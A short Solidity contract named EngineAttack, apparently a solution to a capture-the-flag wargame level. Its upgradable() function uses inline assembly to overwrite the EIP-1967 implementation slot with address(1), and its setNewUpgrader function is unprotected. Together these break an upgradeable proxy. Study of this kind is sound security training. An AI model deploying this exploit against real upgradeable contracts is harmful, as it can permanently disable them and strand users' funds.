pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract EngineAttack is Initializable {

    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;


    struct AddressSlot {
        address value;
    }

    function setNewUpgrader(address newUpgrader) external {
        upgrader = newUpgrader;
    }

       function upgradable() external {
        AddressSlot storage r;
        assembly { r_slot := _IMPLEMENTATION_SLOT }
        r.value = address(1);
    }

}
